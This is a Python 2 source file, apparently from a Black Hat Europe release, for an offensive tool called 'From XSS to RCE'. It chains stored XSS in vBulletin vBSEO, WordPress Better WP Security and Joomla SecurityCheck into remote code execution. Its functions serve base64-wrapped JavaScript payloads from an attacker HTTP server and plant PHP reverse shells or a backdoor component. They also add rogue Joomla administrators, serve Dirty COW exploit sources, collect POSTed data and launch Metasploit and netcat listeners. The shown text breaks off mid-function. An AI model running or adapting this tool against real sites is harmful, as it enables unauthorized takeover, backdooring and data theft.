#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Version: 2.7.5 - Black Hat Europe Release + Extras
# Music Codename: Soul Cypherz - Maya
# Presentation Date: 07/Dec/17
# Release Date: 08/Mar/2018
# Author: Hans-Michael Varbaek
# Company: VarBITS
# Special Credits: MaXe / InterN0T
#
# TODO List:
# - Use another type of web server that's easier to maintain.
# - Custom PHP shell that features a file manager.
# - Maybe reintroduce the feature that allows users to specify their own PHP code.
# - Python GUI like NCurses for example.
# - Make xsser.py compatible with Python3 and eventually switch to this version.
# - Check if xsser.py is run on Linux, as several commands still assume the host OS is Linux.
# - Ensure "requirements.txt" is up to date in each version, and that there's documentation for it.
# - Add proxy support for modules that automatically send the exploit. (e.g. SSH Socks Proxy)
# - All PHP shells uploaded to the target should be base64 encoded.
# - Maybe add additional obfuscation (or encryption) to the payloads in the future.
# - Regex replacement: with https://stackoverflow.com/questions/6116978/how-to-replace-multiple-
# substrings-of-a-string
#   https://gomputor.wordpress.com/2008/09/27/search-replace-multiple-words-or-characters-with-python/
#   https://www.safaribooksonline.com/library/view/python-cookbook-2nd/0596007973/ch01s19.html
#   https://stackoverflow.com/questions/6116978/how-to-replace-multiple-substrings-of-a-string
# - Remake the menu system. It's not very maintainable.
# - Remake how exploits are loaded by the tool.
# -- Then add a lot more exploits to this tool.
# - Add payloads for other content management systems such as Drupal.
# ============================================================================================ #

import os
import re
import sys
import time
import base64
import random
import zipfile
import requests
import traceback
from socket import error as socket_error
from subprocess import check_output  # TODO: Switch completely to this or a similar library instead of os.system()
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

# Non-Standard Libraries
import pygame  # Audio notifications
from jsmin import jsmin  # Minified JavaScript payloads

# Old libraries no longer being used. (There's a good chance some of them may be used in the future.)
# import urllib
# import httplib
# import socket

# Used for generating random filenames for web server requests
random_filename = list('abcdefghijklmnopqrstuvwxyz0123456789')
# print "".join(random.sample(random_filename, 5))+".js"


# https://stackoverflow.com/questions/1855095/how-to-create-a-zip-archive-of-a-directory
def zipdir(path, ziph):
    # ziph is zipfile handle
    for root, dirs, files in os.walk(path):
        for filename in files:
            ziph.write(os.path.join(root, filename))


# Generate the Hello Shell on startup.
# TODO: Make the backdoor name fully dynamic in the future.
def generate_helloshell():
    zipf = zipfile.ZipFile('Hello_Shell.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('Hello_Shell/', zipf)
    zipf.close()


def enable_js_alert():
    os.system("chmod +x js_alert.sh")


# Exit program - Default return code is zero.
def exit_xsser(exit_code=0):
    sys.exit(exit_code)


# ====================== #
#   DEFINED CLASSES
# ====================== #

class FontColors:
    # ANSI font color class
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

    def __init__(self):
        self.not_used = None


# TODO: Look into using another type of "web server" which is just as simple but also more flexible.
# TODO: Merge vBSEO and the WordPress/Joomla classes in the future.
# vBSEO web server class (LinkBack vulnerability specific)
class MyHandler(BaseHTTPRequestHandler):
    # noinspection PyPep8Naming
    def do_GET(self):  # I know this is not PEP8 compliant, but this class uses the "do_GET" format.
        try:
            if self.path.endswith("{}.php".format(evil_php)):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write('<html><head><title>{}</title>'.format(xss_title))
                self.wfile.write('</head><body><center><h1>vBSEO Stored Cross-site Scripting</h1><br /><br />')
                self.wfile.write('<a href="{}" target="_blank">I found this awesome forum</a>'.format(target_link))
                self.wfile.write('</center></body></html>')
                return

            if self.path.endswith("{}.js".format(evil_jsf)):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(js_output)  # Serve JS contents
                return

            if self.path.endswith("js_shell_notify.txt"):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.send_header('Access-Control-Allow-Origin', '*')  # Mostly here to limit browser console errors.
                self.end_headers()
                self.wfile.write('Hello?')
                # NEW CODE BELOW
                # Terminal and Popup Terminal Notifications
                print FontColors.YELLOW + FontColors.BOLD + "[!] JavaScript payload was activated!" + FontColors.ENDC
                # os.system('gnome-terminal --hide-menubar -e "bash -c \' ./js_alert.sh; exec bash\'"')  # ASCII ART
                # Everything seems to becoming deprecated with gnome-terminal, so we've switched to xterm.
                # xterm -hold -e command
                # check_output(['xterm', '-fa', '"Monospace"', '-fs', '14', '-hold', '-e', './js_alert.sh', '&'])
                os.system('xterm -fa "Monospace" -fs 14 -hold -e ./js_alert.sh &')  # Size 14 is quite large
                # xterm -hold -e 'ls' &  # Without the ampersand xterm blocks the python script from executing.
                # TODO: Replace os.system with e.g. subprocess.call() or check_output() in future versions.
                # subprocess.call(["ls", "-al"])
                # subprocess.call("ls -al", shell=True)
                # Activate shell request for vBulletin

                # Because this happens so fast, we need to introduce a one second delay.
                print "[*] Waiting 1 second before automatically activating shell."
                time.sleep(1)
                # TODO: Fix the odd and random 404 error that sometimes occurs.
                payload = {"activateshell": "true"}
                url = "http://{}/misc.php".format(finaltarget)
                requests.get(url, params=payload, timeout=3)
                # TODO: Ask the user for the full URL including HTTP/HTTPS in the future.
                # os.system(
                #     'curl "%s/misc.php?activateshell=true" -o /dev/null -stderr /dev/null &' % finaltarget)
                # If the Python script encounters an error, the response (i.e. error) will be in the JS output
                # which breaks our payload.
                return

            if self.path.endswith("php_shell_notify.txt"):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write('Hello again?')
                you_got_shell()
                return

            if self.path.endswith("dcow32.c"):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(dcow32_output)  # Serve File
                return

            if self.path.endswith("dcow64.c"):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(dcow64_output)  # Serve File
                return

            if self.path.endswith(""):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(
                    '<html><head><title>Empty</title></head><body><h1>Nothing to see here..</h1></body></html>')
                return

            return

        except IOError:
            self.send_error(404, 'File Not Found: {}'.format(self.path))


# WordPress/generic (payload) web server class
class WordPressHandler(BaseHTTPRequestHandler):
    # noinspection PyPep8Naming
    def do_GET(self):  # I know this is not PEP8 compliant, see class implementation.
        try:
            # if js_filename and js_filename != "":
            if self.path.endswith(js_filename):  # TODO: Check size limitations?
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(js_output)  # Serve JS contents
                return

            if self.path.endswith("js_shell_notify.txt"):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.send_header('Access-Control-Allow-Origin', '*')  # Mostly here to limit browser console errors.
                self.end_headers()
                self.wfile.write('Hello?')
                # NEW CODE BELOW
                # Terminal and Popup Terminal Notifications
                print FontColors.YELLOW + FontColors.BOLD + "[!] JavaScript payload was activated!" + FontColors.ENDC
                # os.system('gnome-terminal --hide-menubar -e "bash -c \' ./js_alert.sh; exec bash\'"')  # ASCII ART
                os.system('xterm -fa "Monospace" -fs 14 -hold -e ./js_alert.sh &')
                # New method as gnome-terminal deprecated/removed too many options.
                # Activate shell request for WordPress and Joomla
                if activation_file is not "NOT_APPLICABLE":
                    # Because this happens so fast, we need to introduce a one second delay.
                    print "[*] Waiting 1 second before automatically activating shell."
                    time.sleep(1)

                    # TODO: Test this - New method 2.75
                    # todo  This seems to work, but there's an odd 404 error when the shell is activated.
                    # todo  See if you can eliminate this 404 error.
                    payload = {"activateshell": "true"}
                    url = "http://{}{}".format(target_hostname, activation_file)
                    requests.get(url, params=payload, timeout=3)
                    # TODO: Ask the user for the full URL including HTTP/HTTPS in the future.
                    # curlpath = "{}{}activateshell=true".format(target_hostname, activation_file)
                    # os.system(
                    #     'curl "%s" -o /dev/null -stderr /dev/null &' % curlpath)
                    # If the Python script encounters an error, the response (i.e. error) will be in the JS output
                    # which breaks our payload.
                return

            if self.path.endswith("php_shell_notify.txt"):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write('Hello again?')
                you_got_shell()
                return

            if self.path.endswith("dcow32.c"):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(dcow32_output)  # Serve File
                return

            if self.path.endswith("dcow64.c"):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(dcow64_output)  # Serve File
                return

            # TODO: Make the backdoor name dynamic in the future.
            # TODO: This shouldn't be too hard, as the file being read is now handled elsewhere.
            if self.path.endswith("Hello_Shell.zip"):  # You can change this to anything.
                self.send_response(200)  # Just make sure it's consistent throughout the script.
                # self.send_header('Content-type', 'text/plain')
                self.send_header('Content-type', 'application/octet-stream')
                self.send_header('Content-Disposition', 'attachment; filename=Hello_Shell.zip')
                self.end_headers()
                self.wfile.write(read_joomla_shell_file())
                return

            if self.path.endswith(""):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(
                    '<html><head><title>Empty</title></head><body><h1>Nothing to see here..</h1></body></html>')
                return

            return

        except IOError:
            self.send_error(404, 'File Not Found: {}'.format(self.path))

    # Experimental POST-request handling below.
    # noinspection PyPep8Naming
    # https://stackoverflow.com/questions/4233218/python-how-do-i-get-key-value-pairs-from-the-basehttprequesthandler-http-post-h
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])  # This may cause an error if not set.
            post_data = self.rfile.read(content_length)  # This may also cause an error in some cases.

            true_filename = "".join(random.sample(random_filename, 5))+".txt"
            full_path = "Received_Data/" + true_filename
            with open(full_path, "w") as filename:
                filename.write(post_data)
                print "[*] Wrote POST-data to: {}".format(true_filename)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write("<html><head><title>Empty</title></head><body>"
                             "<h1>Nothing to see here..</h1></body></html>")
            return

        except IOError:
            self.send_error(404, 'File Not Found: {}'.format(self.path))


# Dirty COW File Handling - Quick solution
dcow32_file = open("Exploits/dirtycow32.c")
dcow64_file = open("Exploits/dirtycow64.c")
dcow32_output = dcow32_file.read()
dcow64_output = dcow64_file.read()


# Handle funny audio clip
# PyGame was generally the best option, as LibVLC experienced clipping issues.
def you_got_shell():  # Now PEP8 (i.e. the IDE) is happy with the renamed function name xD
    pygame.mixer.pre_init(44100, -16, 2, 4096)  # Change from 48000 to 44100 for lower pitch
    pygame.init()
    pygame.mixer.init()
    pygame.mixer.music.load('Audio/rapshell1.mp3')
    pygame.mixer.music.play(1)
    return


# TODO: Make the filename dynamic in the future
def read_joomla_shell_file():
    with open("Hello_Shell.zip", "rb") as filename:
        return filename.read()


# Takes a string as input, and:
# - Removes newlines, comments, etc.
# - Base64 encodes payload.
# - Wraps encoded payload into a JS decoder.
def minify_and_encode_js(javascript_input):
    minified = jsmin(javascript_input, quote_chars="'\"")  # Removes comments and extra new lines
    encoded = base64.b64encode(minified)  # Base64 encodes the JS
    output = 'eval(atob("{}"));'.format(encoded)  # Wraps the content into a B64 JS Decoder.
    return output


# Automatically gets all IP addresses and uses the first one.
# If multiple IP addresses are found, the user can then choose which to use.
def get_local_ip():
    try:
        local_ip = check_output(['hostname', '--all-ip-addresses']).strip()
        if len(local_ip.split(' ')) > 1:
            print FontColors.BLUE + FontColors.BOLD
            print "   ╭───────────────────────╮╭───────────╮╭──╮╭──╮"
            print "   │  FROM XSS TO RCE 2.75 ││  IP Addr  ││  ││  │"
            print "   ╰───────────────────────╯╰───────────╯╰──╯╰──╯"
            print FontColors.ENDC
            print FontColors.BOLD + "   Choose which IP address to use:" + FontColors.ENDC
            print " ╔════════════════════════════════════════════════╗"
            counter = 1
            for ip in local_ip.split(' '):
                print " ║ [{}] {:25}                  ║".format(counter, ip)
                counter += 1
            print " ╚════════════════════════════════════════════════╝"
            print FontColors.RED + "\n q. Quit\n" + FontColors.ENDC
            ip_choice = raw_input(FontColors.BOLD + FontColors.BLUE + " >>  " + FontColors.ENDC)
            if ip_choice == 'q':
                exit_xsser()
            elif not ip_choice.isdigit():
                print FontColors.YELLOW + " [!] Your choice must be an integer. Quitting.." + FontColors.ENDC
                exit_xsser(1)
            elif int(ip_choice) > len(local_ip.split(' ')) or int(ip_choice) == 0:
                print FontColors.YELLOW + " [!] Option not recognized. Quitting.." + FontColors.ENDC
                exit_xsser(1)
            else:
                ip_choice = int(ip_choice) - 1
            return local_ip.split(' ')[ip_choice]
        else:
            return local_ip
    except KeyboardInterrupt:
        print FontColors.YELLOW + "\n [!] CTRL+C detected, shutting down." + FontColors.ENDC
        exit_xsser(1)


# Returns a blue colored IP address
# Formerly known as a variable: color_local_ip
def get_colored_ip(ip_address):
    return FontColors.BLUE + ip_address + FontColors.ENDC

# ====================== #
#     MENU FUNCTIONS
# ====================== #


# Main menu
# TODO: Make a better menu system in the future.
def main_menu():
    os.system('clear')
    print FontColors.BLUE + FontColors.BOLD
    print "   ╭───────────────────────╮╭───────────╮╭──╮╭──╮"
    print "   │  FROM XSS TO RCE 2.75 ││ Main Menu ││  ││  │"
    print "   ╰───────────────────────╯╰───────────╯╰──╯╰──╯"
    print FontColors.ENDC
    print FontColors.BOLD + "   Choose which exploit to use: (OSVDB-ID)" + FontColors.ENDC
    print " ╔════════════════════════════════════════════════╗"
    print " ║ [1] vBulletin - vBSEO XSS (70854) [!]          ║"
    print " ║ [2] WordPress - Better WP Security XSS (95884) ║"
    print " ║ [3] Joomla    - Security Check (EDB-ID 39879)  ║"
    print " ║                                                ║"
    print " ║ [?] Drupal (To be implemented)                 ║"
    print " ╚════════════════════════════════════════════════╝"
    print FontColors.RED + "\n q. Quit\n" + FontColors.ENDC
    choose_menu(exec_menu, 0, 0)
    return


# vBulletin menu
def menu1():
    global exploit_selection
    exploit_selection = "vBSEO"
    print FontColors.BLUE + FontColors.BOLD
    print "   ╭───────────────────────╮╭───────────╮╭──╮╭──╮"
    print "   │  FROM XSS TO RCE 2.75 ││ vBulletin ││  ││  │"
    print "   ╰───────────────────────╯╰───────────╯╰──╯╰──╯"
    print FontColors.ENDC
    print FontColors.BOLD + "   Choose which payload to use:" + FontColors.ENDC
    print " ╔════════════════════════════════════════════════╗"
    print " ║ [1] New Plugin (misc.php hook)                 ║"
    print " ║                                                ║"
    print " ║ Note: vBSEO is no longer updated. Many forums  ║"
    print " ║ have likely stopped using this plugin.         ║"
    print " ║ [9] Back                                       ║"
    print " ╚════════════════════════════════════════════════╝"
    print FontColors.RED + "\n q. Quit\n" + FontColors.ENDC
    choose_menu(exec_sub_menu, vbulletin_menu, 1)
    return


# WordPress menu
def menu2():
    global exploit_selection
    exploit_selection = "BetterWPSecurity"
    print FontColors.BLUE + FontColors.BOLD
    print "   ╭───────────────────────╮╭───────────╮╭──╮╭──╮"
    print "   │  FROM XSS TO RCE 2.75 ││ WordPress ││  ││  │"
    print "   ╰───────────────────────╯╰───────────╯╰──╯╰──╯"
    print FontColors.ENDC
    print FontColors.BOLD + "   Choose which payload to use:" + FontColors.ENDC
    print " ╔════════════════════════════════════════════════╗"
    print " ║ [1] WPSEO (robots.txt & .htaccess)             ║"
    print " ║ [2] WordPress Current Theme (footer.php)       ║"
    print " ║ [3] WordPress Hello Plugin (hello.php)         ║"
    print " ║                                                ║"
    print " ║ [9] Back                                       ║"
    print " ╚════════════════════════════════════════════════╝"
    print FontColors.RED + "\n q. Quit\n" + FontColors.ENDC
    choose_menu(exec_sub_menu, wordpress_menu, 2)
    return


# Joomla menu
def menu3():
    global exploit_selection
    exploit_selection = "SecurityCheck"  # NEW OPTION
    print FontColors.BLUE + FontColors.BOLD
    print "   ╭───────────────────────╮╭───────────╮╭──╮╭──╮"
    print "   │  FROM XSS TO RCE 2.75 ││  Joomla!  ││  ││  │"
    print "   ╰───────────────────────╯╰───────────╯╰──╯╰──╯"
    print FontColors.ENDC
    print FontColors.BOLD + "   Choose which payload to use:" + FontColors.ENDC
    print " ╔════════════════════════════════════════════════╗"
    print " ║ [1] Add New Super User (Admin)                 ║"
    print " ║ [2] Auto-Install Hello Shell Backdoor [NEW]    ║"
    print " ║                                                ║"
    print " ║ Note: Select \"no payload\" on next page.        ║"
    print " ║                                                ║"
    print " ║ [9] Back                                       ║"
    print " ╚════════════════════════════════════════════════╝"
    print FontColors.RED + "\n q. Quit\n" + FontColors.ENDC
    choose_menu(exec_sub_menu, joomla_menu, 3)
    return


# Payload menu
def payload_menu_func(origin):
    print FontColors.BLUE + FontColors.BOLD
    print "   ╭───────────────────────╮╭───────────╮╭──╮╭──╮"
    print "   │  FROM XSS TO RCE 2.75 ││ Payloads  ││  ││  │"
    print "   ╰───────────────────────╯╰───────────╯╰──╯╰──╯"
    print FontColors.ENDC
    print FontColors.BOLD + "   Choose which shell to use:" + FontColors.ENDC
    print " ╔════════════════════════════════════════════════╗"
    print " ║ [1] Reverse Meterpreter (PHP)                  ║"
    print " ║ [2] PentestMonkey Reverse PHP Shell            ║"
    print " ║ [3] PentestMonkey Reverse PHP Shell (Notify)   ║"
    print " ║                                                ║"
    print " ║ [5] No payload (special cases)                 ║"
    print " ║ [9] Back                                       ║"
    print " ╚════════════════════════════════════════════════╝"
    print FontColors.RED + "\n q. Quit\n" + FontColors.ENDC
    choose_menu(exec_sub_menu, payload_menu, origin)
    return


def prepare_payload_banner():
    os.system('clear')
    print FontColors.BLUE + FontColors.BOLD
    print "   ╭───────────────────────╮╭───────────╮╭──╮╭──╮"
    print "   │  FROM XSS TO RCE 2.75 ││ Config    ││  ││  │"
    print "   ╰───────────────────────╯╰───────────╯╰──╯╰──╯"
    print FontColors.ENDC


# Handle menu selection
def choose_menu(menu_type, cms_actions, origin):
    choice = 0  # This is just to make the interpreter happy.
    try:
        choice = raw_input(FontColors.BOLD + FontColors.BLUE + " >>  " + FontColors.ENDC)
    except KeyboardInterrupt:
        print FontColors.YELLOW + "\n [!] CTRL+C detected, shutting down." + FontColors.ENDC
        exit_xsser()
    menu_type(choice, cms_actions, origin)


# Execute main menu option
def exec_menu(choice, cms_actions, origin):
    os.system('clear # {} {}'.format(cms_actions, origin))  # The extra code is just to make the IDE happy.
    ch = choice.lower()
    if ch == '':
        menu_actions['main_menu']()  # This doesn't work if we remove ()
    else:
        try:
            menu_actions[ch]()  # This doesn't work if we remove ()
        except KeyError:
            print " [!] Invalid selection, please try again.\n"
            traceback.print_exc()
            menu_actions['main_menu']()  # This doesn't work if we remove ()
    return


# Execute sub menu option
def exec_sub_menu(choice, sub_actions, origin):
    os.system('clear')
    ch = choice.lower()
    if ch == '':
        menu_actions[origin]()  # Go back to the sub-menu where we came from, not the main menu
    else:
        try:
            sub_actions[ch]()  # Go into the next level sub-menu to choose e.g. payload type
        except KeyError:
            print " [!] Invalid selection, please try again.\n"
            traceback.print_exc()
            menu_actions[origin]()  # Go back to the sub-menu where we came from, not the main menu
    return


# Back to main menu
def back():
    menu_actions['main_menu']()


# vBulletin menu
def vbmenu1():
    global payload_selection
    payload_selection = "vb_misc"
    payload_menu_func(1)
    # vBulletin New Plugin (misc.php hook)


# WordPress menu
def wpmenu1():
    global payload_selection
    payload_selection = "wpseo"
    payload_menu_func(2)
    # WordPress WPSEO (robots.txt & .htaccess)


def wpmenu2():
    global payload_selection
    payload_selection = "wp_footer_theme"
    payload_menu_func(2)
    # WordPress Current Theme (footer.php)


def wpmenu3():
    global payload_selection
    payload_selection = "wp_hello_plugin"
    payload_menu_func(2)
    # WordPress Hello Plugin (hello.php)

  
# Joomla menu
def jmenu1():
    global payload_selection
    payload_selection = "add_new_admin"
    payload_menu_func(3)
    # Joomla Add New Admin


def jmenu2():
    global payload_selection
    payload_selection = "install_backdoor"
    payload_menu_func(3)
    # Joomla Auto-Install Hello Shell


# =============================== #
# EXPLOITS AND PAYLOADS FUNCTIONS
# =============================== # 

# Payload menus
# TODO: This could be loaded from a separate file in the future?
def meterpreter():
    global exploit_selection
    global php_selection
    php_selection = "meterpreter"
    php_output = prepare_payload(php_selection)  # Stores our configured PHP shell
    global js_output
    js_output = update_javascript_payload(payload_selection, php_output)  # Stores our final JavaScript payload
    js_output = minify_and_encode_js(js_output)  # New encoding step in version 2.75 - Extra
    write_rc_file()  # Write an RC file for Metasploit's Msfconsole
    rcfile = '/tmp/xsser.rc'
    # os.system(
    #     'gnome-terminal --hide-menubar -e "bash -c \'echo [*] Executing metasploit; msfconsole -r ' + rcfile +
    #     '; exec bash\'"')
    os.system('xterm -fa "Monospace" -fs 14 -hold -e "msfconsole -r ' + rcfile + '" &')  # Please test this works
    # handle_exploit(exploit_selection, js_output, lhost)
    handle_exploit(exploit_selection, lhost)  # The JS is not used in handle_exploit


def pentestmonkey():
    global php_selection
    php_selection = "pentestmonkey"
    php_output = prepare_payload(php_selection)  # Stores our configured PHP shell
    global js_output
    js_output = update_javascript_payload(payload_selection, php_output)  # Stores our final JavaScript payload
    js_output = minify_and_encode_js(js_output)  # New encoding step in version 2.75 - Extra
    os.system('xterm -fa "Monospace" -fs 14 -hold -e "nc -lnvp ' + lport + ' -s ' + lhost + '" &')
    # handle_exploit(exploit_selection, js_output, lhost)
    handle_exploit(exploit_selection, lhost)  # The JS is not used in handle_exploit


def pentestmonkey_notify():
    global php_selection
    php_selection = "pentestmonkey_notify"
    php_output = prepare_payload(php_selection)  # Stores our configured PHP shell
    global js_output
    js_output = update_javascript_payload(payload_selection, php_output)  # Stores our final JavaScript payload
    js_output = minify_and_encode_js(js_output)  # New encoding step in version 2.75 - Extra
    os.system('xterm -fa "Monospace" -fs 14 -hold -e "nc -lnvp ' + lport + ' -s ' + lhost + '" &')
    # handle_exploit(exploit_selection, js_output, lhost)
    handle_exploit(exploit_selection, lhost)  # The JS is not used in handle_exploit


# TODO: Optimize and simplify in the future.
def payload_not_specified():
    global php_selection
    php_selection = "payload_not_specified"
    php_output = prepare_payload(php_selection)  # Stores our configured PHP shell
    global js_output
    js_output = update_javascript_payload(payload_selection, php_output)  # Stores our final JavaScript payload
    js_output = minify_and_encode_js(js_output)  # New encoding step in version 2.75 - Extra
    # handle_exploit(exploit_selection, js_output, lhost)
    handle_exploit(exploit_selection, lhost)  # The JS is not used in handle_exploit


def write_rc_file():
    user_input = "use multi/handler\n\
set payload php/meterpreter/reverse_tcp\n\
set LHOST " + lhost + "\n\
set LPORT " + lport + "\n\
run -j"
    filepointer = open('/tmp/xsser.rc', 'w')
    filepointer.write(user_input)
    filepointer.close()


# Preferably, this function will load/import the selected exploit module and execute it in the future.
# def handle_exploit(exploit, js_payload, localhost):
def handle_exploit(exploit, localhost):
    global js_filename
    if exploit == 'vBSEO':
        try:
            global evil_php
            global evil_jsf
            global xss_title
            global target_link
            global finaltarget
            global http_port
            global activation_file  # This may not be needed for the vBSEO module
            http_port = 80  # Port to listen on. Does not really need to be dynamic at the moment.
            # TODO: Consider making the xsser.py tool automatically send this exploit.
            # TODO: Make a "random filename" function.
            evil_php = "".join(random.sample(random_filename, 9))
            evil_jsf = "".join(random.sample(random_filename, 9))
            xss_title = 'The Friendly Website" size="70" dir="ltr" tabindex="1"><script src="http://{}:{}/{}.js">' \
                        '</script><br '.format(localhost, http_port, evil_jsf)
            print " [?] You need to enter a URL to exploit."
            print " [?] Example: http://forum-site.tld/1234-a-nice-thread.html\n"
            target_link = raw_input(FontColors.BOLD + FontColors.BLUE + "  >> " + FontColors.ENDC)
            striptarget = re.compile('(http://|https://)')
            newtarget = striptarget.sub('', target_link)
            striptarget2 = re.compile('/.*')
            finaltarget = striptarget2.sub('', newtarget)
            # print finaltarget
            # DEBUG: Should return e.g. mycompany.com.au
            try:
                server = HTTPServer((localhost, http_port), MyHandler)
                print FontColors.BLUE + FontColors.BOLD + '\n\t╔═════════════════════════════╗'
                print '\t║ Started Payload HTTP Server ║'
                print '\t╚═════════════════════════════╝'
                print FontColors.ENDC
                print ' [*] Serving attack file from: http://{}:{}/{}.php '.format(localhost, http_port, evil_php)
                print ' [*] Serving payload file from: http://{}:{}/{}.js '.format(localhost, http_port, evil_jsf)
                print ' [!] Browse to: "' + FontColors.BLUE + FontColors.BOLD + 'misc.php?activateshell=true' + \
                      FontColors.ENDC + '", to activate the payload.'
                print ' [+] DCOW (SUID) 32-bit src is available at: http://{}:{}/dcow32.c'.format(localhost, http_port)
                print ' [+] DCOW (SUID) 64-bit src is available at: http://{}:{}/dcow64.c'.format(localhost, http_port)
                print ' [?] Press CTRL+C to stop the server and exit the script. \n'
                print '-------------- HTTP Requests Below --------------'
                server.serve_forever()
            except KeyboardInterrupt:  # Get all the unexpected keyboard interrupts
                print FontColors.YELLOW + "\n [!] CTRL+C detected, shutting down." + FontColors.ENDC
                # server.socket.close()  # I don't think there's anything to close if the server class fails.
                exit_xsser(1)
            except socket_error:
                print " [!] A socket error occurred. Please check the listening IP address again."
                exit_xsser(1)
        except KeyboardInterrupt:  # Get all the unexpected keyboard interrupts
            print FontColors.YELLOW + "\n [!] CTRL+C detected, shutting down." + FontColors.ENDC
            exit_xsser(1)
    elif exploit == 'BetterWPSecurity':
        try:
            global activation_file
            if payload_selection == 'wp_hello_plugin':
                activation_file = "/wp-content/plugins/hello.php"  # Removed '?' for requests.get()
            elif payload_selection == 'wp_footer_theme':
                activation_file = "/"  # Removed '?' for requests.get()
            elif payload_selection == 'wpseo':
                activation_file = "/robots.txt"  # Removed '?' for requests.get()
            else:
                activation_file = "Unknown Payload - Restart Script"
                exit_xsser()

            js_filename = "".join(random.sample(random_filename, 5))+".js"  # 5 letters/numbers
            unencoded_payload = '<script src="http://' + localhost + '/' + js_filename + '"></script>'
            base64_payload = '"><script>document.write(atob(/' + \
                             base64.b64encode(unencoded_payload) + \
                             '/.source))</script>'

            fourohfour_url = "".join(random.sample(random_filename, 7)) + ".php"  # Simpler and more random
            # Removed trailing "?" as requests.get() handles that.

            try:
                # TODO: Use python requests here instead.
                # TODO: The previous code below is still there for testing purposes.
                # TODO: You can remove the old code once the new code is 100% working.
                # conn = httplib.HTTPConnection(target_hostname, 80)
                # conn.request("GET", "/" + fourohfour_url + base64_payload)
                # resp = conn.getresponse()
                # output = resp.read()

                # Python 'requests' hack to send params unencoded.
                url = "http://{}/{}".format(target_hostname, fourohfour_url)
                s = requests.Session()
                req = requests.Request(method='GET', url=url)
                prep = req.prepare()
                prep.url = url + base64_payload
                r = s.send(prep)
                # print resp.url  # FUTURE DEBUG
                output = r.text

                if r.status_code == 404:
                    print "\n [*] 404 received, checking that WordPress handled the error."
                    if re.search("(That page can)", output):
                        print " [*] It looks like WordPress handled the injection."
                        http_port = 80  # Port to listen on. Does not really need to be dynamic at the moment.
                        try:
                            server = HTTPServer((localhost, http_port), WordPressHandler)
                            print FontColors.BLUE + FontColors.BOLD + '\n\t╔═════════════════════════════╗'
                            print '\t║ Started Payload HTTP Server ║'
                            print '\t╚═════════════════════════════╝'
                            print FontColors.ENDC
                            print ' [*] Serving payload file from: http://{}:{}/{}'.format(
                                  localhost, http_port, js_filename)
                            print ' [!] Browse to: "' + FontColors.BLUE + FontColors.BOLD + activation_file + \
                                  '?activateshell=true' + FontColors.ENDC + '", to activate the payload.'
                            print ' [+] DCOW (SUID) 32-bit src is available at: http://{}:{}/dcow32.c'.format(
                                  localhost, http_port)
                            print ' [+] DCOW (SUID) 64-bit src is available at: http://{}:{}/dcow64.c'.format(
                                  localhost, http_port)
                            print ' [?] Press CTRL+C to stop the server and exit the script. \n'
                            print '-------------- HTTP Requests Below --------------'
                            server.serve_forever()
                        except KeyboardInterrupt:
                            # server.socket.close()
                            exit_xsser()
                    else:
                        print " [!] The web server handled the 404 error page, meaning the injection did not " \
                              "occur within Better WP Security."
            except Exception as error:
                print " [!] An error occurred: {}\n [!] Shutting down.".format(error)
                traceback.print_exc()
                # print "Localhost variable: {}".format(localhost)  # DEBUG
                exit_xsser(1)
        except KeyboardInterrupt:
            print FontColors.YELLOW + "\n [!] CTRL+C detected, shutting down." + FontColors.ENDC
            exit_xsser(1)
    elif exploit == 'SecurityCheck':
        try:
            if payload_selection == 'add_new_admin':
                activation_file = "NOT_APPLICABLE"
            elif payload_selection == 'install_backdoor':
                activation_file = "NOT_APPLICABLE"
                # "/index.php?option=com_helloshell&"
                # TODO: Make it possible to use meterpreter or the reverse PHP shell in the future.
                # TODO: Activation should be 100% automatic like the other payloads.

            else:
                activation_file = "Unknown Payload - Restart Script"
                exit_xsser()
            js_filename = "".join(random.sample(random_filename, 5))+".js"  # 5 letters/numbers
            unencoded_payload = '<script src="http://' + localhost + '/' + js_filename + '"></script>'
            # <script src="http://192.168.0.1/random_filename.js"></script>
            # urlencoded_payload = urllib.quote_plus(unencoded_payload)  # Remove if new code is working.

            # exploit_url = "index.php?option="
            exploit_url = "index.php"  # New URL when using requests.get()
            try:

                payload = {"option": unencoded_payload}
                url = "http://{}/{}".format(target_hostname, exploit_url)
                resp = requests.get(url, params=payload, timeout=3)
                output = resp.text

                if resp.status_code == 400:
                    print "\n [*] 400 received, checking that Joomla SecurityCheck handled the error."
                    if re.search("(It has been detected a sequence that could mean a hacker attack)", output):
                        print " [*] It looks like Joomla SecurityCheck handled the injection."
                        http_port = 80  # Port to listen on. Does not really need to be dynamic at the moment.
                        try:
                            server = HTTPServer((localhost, http_port), WordPressHandler)
                            print FontColors.BLUE + FontColors.BOLD + '\n\t╔═════════════════════════════╗'
                            print '\t║ Started Payload HTTP Server ║'
                            print '\t╚═════════════════════════════╝'
                            print FontColors.ENDC
                            print ' [*] Serving payload file from: http://{}:{}/{} '.format(
                                  localhost, http_port, js_filename)
                            # print ' [!] Browse to: "'+fontcolors.BLUE+fontcolors.BOLD+activation_file+'
